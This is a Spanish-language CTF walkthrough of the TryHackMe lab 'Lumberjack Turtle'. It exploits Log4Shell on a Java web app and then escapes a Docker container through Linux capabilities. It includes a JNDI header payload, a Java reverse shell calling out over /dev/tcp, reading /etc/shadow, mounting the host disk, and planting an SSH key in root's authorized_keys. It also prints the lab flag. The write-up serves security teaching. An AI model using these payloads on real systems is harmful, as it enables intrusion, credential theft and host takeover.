---
layout      : post
title       : "TryHackMe - Lumberjack Turtle"
author      : lanz
footer_image: assets/images/footer-card/linux-icon.png
footer_text : Linux
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-banner.png
category    : [ thm ]
tags        : [ Log4Shell, Java, docker-escape, capabilities ]
---
Entorno Linux nivel medio. Conoceremos la vulnerabilidad `Log4Shell` y jugaremos con nuestras capacidades para escapar de un contenedor `Docker`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-lab-information.png" style="width: 50%;"/>

💥 **Laboratorio creado por** [SilverStr](https://tryhackme.com/p/SilverStr).

## TL;DR (Spanish writeup)

Escapando sin dejar logs.

Encontraremos un sitio web, en él iremos descubriendo que internamente se está usando la librería `log4j`, la cual es vulnerable al ataque `Log4Shell`, aprovecharemos esta brecha para obtener una sesión en un contenedor como el usuario `root`.

Veremos que como parte de su configuración, el contenedor activó algunas `capabilities`, exploraremos 3 de ellas para entender el cómo podemos escapar del contenedor y llegar a la máquina host siendo el usuario `root`.

...

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

I'm fine,

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeracion)
3. [Explotación](#explotacion)
  * [¿Log4Shell?](#explotacion-log4shell)
  * [Log4Shell, construimos el entorno](#explotacion-log4shell-env)
  * [¡Log4Shell!](#explotacion-log4shell-shell)
4. [Escalada de privilegios](#escalada-de-privilegios)
    * [De Docker al Host usando Capabilities](#escalada-docker-host)
        * [CAP_DAC_READ_SEARCH](#escalada-docker-host-CAP_DAC_READ_SEARCH)
        * [CAP_SYS_MODULE](#escalada-docker-host-CAP_SYS_MODULE)
        * [SYS_ADMIN](#escalada-docker-host-SYS_ADMIN)
    * [Shell como root en el host](#escalada-docker-host-root)
6. [Post-Explotación](#post-explotacion)

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

Inicialmente, vamos a descubrir que puertos (servicios) tiene activos el entorno al que vamos a atacar, nos apoyaremos de `nmap` para ello:

```bash
nmap -p- --open -v 10.48.133.243 -oA tcp-all-thm-lumberjack
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535 puertos |
| --open    | Devuelve solo los puertos que estén abiertos |
| -v        | Permite ver en consola lo que va encontrando |
| -oA       | Guarda el output en diferentes formatos, entre ellos uno "grepeable". Lo usaremos junto a la función [extractPorts](https://pastebin.com/raw/X6b56TQ8) de [S4vitar](https://s4vitar.github.io/) para copiar los puertos en la clipboard rápidamente |

Con el escaneo obtenemos los siguientes puertos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Servicio que permite la obtención de una terminal de forma segura |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Servicio para interactuar con un servidor web |

> Usando la función `extractPorts` (referenciada antes) podemos tener rápidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuviéramos varios puertos evitamos tener que escribirlos uno a uno:
 
> `extractPorts tcp-all-thml-lumberjack.gnmap`

Con `nmap` también podemos intentar obtener la versión del software que se está usando en el puerto (servicio) y aprovechando, le indicamos que use algunos de sus scripts por defecto a ver si encuentra al que no tengamos aún:

```bash
nmap -sCV -p 22,80 10.48.133.243 -oA tcp-ports-thm-lumberjack
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Indicamos a que puertos queremos realizar el escaneo |
| -sC       | Ejecuta scripts predefinidos contra cada servicio |
| -sV       | Intenta extraer la versión del servicio |

Yyy obtenemos cositas:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0) |
| 80     | HTTP     | Nagios NSCA |

Pocas cosas, pero nos sirve para empezar, a darle!

# Enumeración [#](#enumeracion) {#enumeracion}

Empecemos con el sitio web, al visitarlo vemos:

## Servicio web [📌](#enumeracion-puerto-80) {#enumeracion-puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-web-80.png" style="width: 100%;"/>

Un simple mensaje raro y ya. Hace referencia a `C` y a `Java` (lenguajes de programación), posiblemente solo sea una forma de hablar, pero tengámoslo en cuenta por si algo.

Si visitamos algo que no exista, nos devuelve:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-web-80-error.png" style="width: 100%;"/>

Buscando en la web sobre ese error, se nos indica que viene de [Spring Boot](https://www.arquitecturajava.com/spring-boot-que-es/), framework de `Java` (nuestra referencia anterior) para la creación de webs de forma sencilla.

Bien, lo que conocemos ya es que tiene que ver con `Java` y `Spring Boot`, sigamos explorando...

Al realizar un barrido de directorios y archivos sobre el sitio web encontramos la ruta `/~logs`, si ahora barremos sobre ese directorio nos encuentra la ruta `/log4j`:

```bash
ffuf -c -w /opt/seclists/Discovery/Web-Content/common.txt -u http://10.48.160.23/FUZZ
#---> http://10.48.160.23/~logs

ffuf -c -w /opt/seclists/Discovery/Web-Content/common.txt -u http://10.48.160.23/~logs/FUZZ
#---> http://10.48.160.23/~logs/log4j
```

Al momento de encontrar la ruta `log4j` alojada en la web, de una recordé un ataque que fue muy viral y que tiene que ver con **Java**: `Log4Shell`.

El sitio nos dio suficientes pistas para direccionarnos a probar ese ataque, así que a investigar.

# Explotación [#](#explotacion) {#explotacion}

## Log4Shell [📌](#explotacion-log4shell) {#explotacion-log4shell}

> "El 9 de diciembre de 2021 se revela al público la vulnerabilidad de ejecución remota de código (RCE) denominada Log4Shell, que afecta a la librería de software de código abierto Log4j, desarrollada en lenguaje Java y mantenida por Apache Software Foundation" ~ [incibe.es](https://www.incibe.es/incibe-cert/blog/log4shell-analisis-vulnerabilidades-log4j)

> "... un servidor es vulnerable siempre que reciba unos datos controlados por el usuario y los pase por la librería Log4j" ~ [incibe.es](https://www.incibe.es/incibe-cert/blog/log4shell-analisis-vulnerabilidades-log4j)

Ihsss, pues interesante, entendamos un poco de la vuln:

* [CVE-2021-44228 (10.0 - Critical)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
* [Log4Shell: análisis de vulnerabilidades en Log4j](https://www.incibe.es/incibe-cert/blog/log4shell-analisis-vulnerabilidades-log4j)
* [Log4Shell : JNDI Injection via Attackable Log4J](https://blog.shiftleft.io/log4shell-jndi-injection-via-attackable-log4j-6bfea2b4896e)
* [Exploiting Log4Shell — How Log4J Applications Were Hacked](https://infosecwriteups.com/exploiting-log4shell-how-log4j-applications-were-hacked-906fe13aeded)

Como nos indican las referencias, es una vuln que permite la ejecución de código remotamente, aprovechando la librería **Log4j** y sus [lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html), que són funciones extra para darle dinamismo a los logs (en este caso el lookup teso es `JNDI`, el cual permite resolver/encontrar/ejecutar objetos **Java**).

Como atacantes debemos levantar un servidor **LDAP**, usar las cabeceras del sitio web a ver si alguna pasa por la librería **Log4j**, invocar el lookup **JNDI** (`${jndi:ldap://attacker.com/wenas}`) para resolver un objeto **Java** que tengamos previamente en nuestro servidor y potencialmente intentar conseguir ejecución remota de comandos.

Nos apoyaremos de esta guía: [TRY HACK ME: Write-Up Exploiting Log4j](https://medium.com/@kumarishefu.4507/try-hack-me-write-up-exploiting-log4j-aa0a07c544bc#9de3)

## Log4Shell - construcción de entorno [📌](#explotacion-log4shell-env) {#explotacion-log4shell-env}

* Instalación de **Java**
* Descarga del repo [marshalsec](https://github.com/mbechler/marshalsec)

Por si obtienes problemas con **maven** al skipear tests: [stackoverflow.com](https://stackoverflow.com/questions/7456006/maven-package-install-without-test-skip-tests).

* Levantar servidor **LDAP**

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.188.222/#Exploit
```

Usamos nuestra IP de atacante. Obtendremos el mensaje de que está en escucha por el puerto `1389`. 

* Vamos a levantar un servidor web en el puerto 80

```bash
sudo python3 -m http.server 80
```

* Creamos archivo `Exploit.java` con el contenido malicioso a ejecutar

Le diremos que mande una petición web a nuestro puerto 80 buscando el archivo `holaa...txt`:

```java
public class Exploit {
 static {
  try {
   java.lang.Runtime.getRuntime().exec("wget http://192.168.188.222/holaaaaaaaaaaaa.txt");
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

Y lo compilamos para que sirva contra **Java 8** (la mayoría de entornos vulnerables a **Log4Shell** usan Java 8):

```bash
javac Exploit.java -source 8 -target 8
```

* Preparamos nuestra sentencia `JNDI` y la inyección

Le diremos que aproveché el lookup **JNDI** para mediante el esquema **LDAP** intentar resolver el objeto `Java` que tenemos (Exploit):

```java
${jndi:ldap://192.168.188.222:1389/Exploit}
```

Ahora debemos enviar esa línea como parte de alguna cabecera, entre prueba y prueba, al enviar esta petición vemos cositas:

```html
GET / HTTP/1.1
Host: 10.48.160.23
User-Agent: Mozilla
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8${jndi:ldap://192.168.188.222:1389/Exploit}
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Access-Control-Request-Method: 1
Access-Control-Request-Headers: 2
Origin: 3
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-burp-reqYres-log4shell-wget.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-bash-log4shell-wget.png" style="width: 100%;"/>

EPALEEEEEEEEEE, vemos que se intentó la petición hacia el archivo `hola...txt`, así que tenemos ejecución de comandooooooos!!

## ¡Log4Shell! [📌](#explotacion-log4shell-shell) {#explotacion-log4shell-shell}

Tomamos una definición de reverse shell contra **Java** de esta web: [https://www.revshells.com/](https://www.revshells.com/), modificamos el archivo `Exploit.java`:

```java
public class Exploit {
 static {
  Process p;
  try {
   p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.188.222/4452 0>&1");
   p.waitFor();
   p.destroy();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

Guardamos, compilamos, levantamos puerto `4452` (`nc -lvp 4452`) y volvemos a enviar la peticióóóón:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-bash-log4shell-nc-rev-sh.png" style="width: 100%;"/>

Yyyyy estamos dentro!!!!!!

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

## Docker -> Host [📌](#escalada-docker-host) {#escalada-docker-host}

Inicialmente, estamos como el usuario `root`, pero el tema es que estamos en un contenedor de `Docker`, necesitamos buscar una manera de llegar al host que está sirviendo ese contenedor...

Podemos apoyarnos de [cdk](https://github.com/cdk-team/CDK), herramienta que ayuda a obtener información de un contenedor, como permisos, archivos curiosos y potenciales vías de escape (para llegar al host).

Descargamos el release, lo subimos a la máquina víctima y ejecutamos:

```bash
./cdk_linux_amd64 evaluate
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-bash-docker-root-cdk.png" style="width: 100%;"/>

Encontró 3 capabilities, que son permisos otorgados al contenedor para su interacción interna con procesos, solo que al ser `root` podemos aprovecharlos para intentar llegar al host:

```txt
CAP_DAC_READ_SEARCH
CAP_SYS_MODULE
SYS_ADMIN
```

Exploremos cada una y el cómo podríamos escapar.

### CAP_DAC_READ_SEARCH [📌](#escalada-docker-host-CAP_DAC_READ_SEARCH) {#escalada-docker-host-CAP_DAC_READ_SEARCH}

* [https://github.com/cdk-team/CDK/wiki/Exploit:-cap-dac-read-search](https://github.com/cdk-team/CDK/wiki/Exploit:-cap-dac-read-search)
* [https://www.geeksforgeeks.org/computer-networks/difference-between-dac-and-mac/](https://www.geeksforgeeks.org/computer-networks/difference-between-dac-and-mac/)
* [Guia detallada sobre esta capability y como atacarla](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)

Esta -capacidad- le permite al contenedor leer cualquier archivo del host.

*️⃣ **Usando CDK**:

Con la propia herramienta [cdk](https://github.com/cdk-team/CDK) podemos usar esta capacidad, por ejemplo, para leer el archivo que contiene usuarios y contraseñas de los usuarios:

```bash
./cdk run cap-dac-read-search /etc/shadow
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-bash-docker-root-cdk-cap_dac_read_search-shadow.png" style="width: 100%;"/>

*️⃣ **Usando SHOCKER**:

Manualmente también podemos leer archivos, nos apoyamos de un script en `C` llamado `shocker`, realizamos [estos cambios para hacer que el script sea más dinámico](https://tbhaxor.com/container-breakout-part-2/#lab-abusing-dacreadsearch-capability) y lo compilamos:


```bash
cc -Wall -std=c99 -O2 shocker.c -static
```

Subimos el binario generado y lo ejecutamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-bash-docker-root-shocker-cap_dac_read_search-shadow.png" style="width: 100%;"/>

Con eso bastaría para leer archivos alojados en el host, podemos buscar archivos de configuración, llaves SSH, backups, etc.

### CAP_SYS_MODULE [📌](#escalada-docker-host-CAP_SYS_MODULE) {#escalada-docker-host-CAP_SYS_MODULE}

* [Exploiting Linux Capabilities: CAP_SYS_MODULE](https://redfoxsec.com/blog/exploiting-linux-capabilities-capsysmodule-exploits/)
* [LAB: The Basics: CAP_SYS_MODULE](https://tbhaxor.com/exploiting-linux-capabilities-part-6/#lab-the-basics-capsysmodule)
* [How I Hacked Play-with-Docker and Remotely Ran Code on the Host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

Esta -capacidad- permite interactuar directamente con el kernel del host, lo que significaría modificar/añadir funcionalidades al sistema, o sea, ejecutar código creado por nosotros.

Realizar la configuración del ataque es sencillo, pero al probar en 2 entornos no logré replicarlo, siempre obtuve un error al ejecutar el `make`.

Sin embargo, [en la máquina **Monitors** de **HackTheBox** vimos el poder de esta capacidad para escapar y escalar privilegios](https://lanzt.github.io/htb/monitors#escalada-de-privilegios).

### SYS_ADMIN [📌](#escalada-docker-host-SYS_ADMIN) {#escalada-docker-host-SYS_ADMIN}

* [Container Escape: All You Need is Cap](https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities)
* [Container breakouts : Abusing SYS_ADMIN capability](https://www.hackitude.in/docker-security/container-breakouts/abusing-capabilities/sys_admin)
* [CAP_SYS_ADMIN](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=cap_sys_admin#cap_sys_admin)

Esta -capacidad- da el poder de ser básicamente `root` en el sistema, ya que se pueden levantar monturas (`mount`) o modificar temas relacionados con el kernel.

Una montura es muy poderosa y más si necesitamos escapar de un contendor, la podemos imaginar como un portal. Este "portal" nos va a permitir acceder a información en tiempo real de dos sitios distintos.

Por lo tanto, si hacemos una montura del disco dentro del contenedor, estaríamos creando un "portal" para interactuar (ver, crear, modificar y borrar) directamente con los archivos del disco, pero no una copia :o

Si buscamos cuál es el disco del host en el que está montado el contenedor encontramos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-bash-docker-root-cap_sys_admin-lsblk.png" style="width: 100%;"/>

El disco es `nvme0n1` y la partición que tiene toda la info (**40gb**) se llama `nvme0n1p1`, esta es la que necesitamos y la que vamos a montar:

```bash
mkdir /tmp/palmonte
mount /dev/nvme0n1p1 /tmp/palmonte
```

Al acceder y revisar esa monturaaaaaa:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-bash-docker-root-cap_sys_admin-mount-host-files.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-bash-docker-root-cap_sys_admin-mount-host-files-root.png" style="width: 100%;"/>

AYYY, tenemos acceso a todos los archivos del hoooost!!

### Shell como root en el host [📌](#escalada-docker-host-root) {#escalada-docker-host-root}

Podríamos hacer varias cositas, pero juguemos con llaves **SSH**.

Existe un archivo alojado en la carpeta `$HOME/.ssh` que le indica al sistema que todas las llaves públicas alojadas en él tienen permiso para acceder como ese usuario sin solicitar contraseña, el usuario es el `authorized_keys` y es con el que vamos a jugar :P 

En nuestra máquina atacante necesitamos generar (si no las tenemos aún) nuestras llaves, tanto la privada como la pública:

```bash
ssh-keygen
```

La llave pública nos quedará alojada en el objeto `$HOME/.ssh/*.pub`, tomamos su contenido y procedemos a pegarlo en el archivo `authorized_keys` del usuario víctima (`/root/.ssh/authorized_keys`):

```bash
cd /tmp/palmonte/root/
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEv1dlbQe116kHJsAvu+Bm4DJTCWZB62KGIpxiDFWgAH kali@kali" >> .ssh/authorized_keys
```

Intentamos iniciar sesión en la máquina víctima como ese usuario (el sistema encontrará que estamos listados en el `authorizated_keys` de ese usuario, hará un jueguito con esa llave publica cifrando información y espera que podamos descifrarla, si todo está bien, habremos creado una sesión como el usuario `root` sin tener contraseñas o información de él, únicamente modificando un archivo :P):

```bash
ssh root@10.48.144.121
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/lumberjack-turtle/thmLUMBERJACK-TURTLE-bash-ssh-root-bash.png" style="width: 100%;"/>

¡epaleeee, somos `root` en el hoooooOOOooost!

# Post-Explotación [#](#post-explotacion) {#post-explotacion}

## Flags [📌](#post-explotacion-flags) {#post-explotacion-flags}

Hola, Est4ESl@FLaG_THM_As1e$

...

Máquina con una vuln muuuy relevante en su momento, me gustó, ya que no la había probado y en verdad se ve el peligro por el que pasaron algunos logs :P Escapar de los contenedores siempre es divertido, hay que buscar y buscar, pero se puede.

Muchas gracias por pasarte, espero te haya aportado y nos leeremos después, gracias gracias.

A darle duro y a seguir rompiendo de todoooooo!!!!!!